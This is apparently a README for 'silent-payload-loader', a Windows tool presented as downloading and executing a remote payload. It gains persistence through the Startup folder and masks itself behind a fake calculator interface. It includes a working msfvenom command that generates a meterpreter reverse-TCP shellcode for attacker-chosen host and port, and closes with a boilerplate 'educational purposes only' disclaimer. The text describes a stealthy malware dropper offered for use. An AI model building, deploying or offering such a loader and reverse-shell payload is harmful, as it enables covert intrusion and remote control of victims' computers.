# silent-payload-loader

**silent-payload-loader** is a lightweight Windows tool designed to download and execute a payload from a remote server while ensuring persistence by copying itself to the Windows Startup folder. The tool runs silently in the background, disguising its actions with a fake calculator interface in the foreground.

**Note**: You need to change the defined PAYLOAD in line 

## Features:
- Downloads and executes a remote payload.
- Ensures persistence by copying itself to the Windows Startup folder.
- Hides its malicious actions by running a fake calculator.
- Executes payloads silently in the background.

## Generate shellcode:
Example for a meterpreter (64bit): 
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw -o payload.bin
```

## Disclaimer:
This tool is intended for educational and research purposes only. Do not use it without explicit permission. The author is not responsible for any misuse.
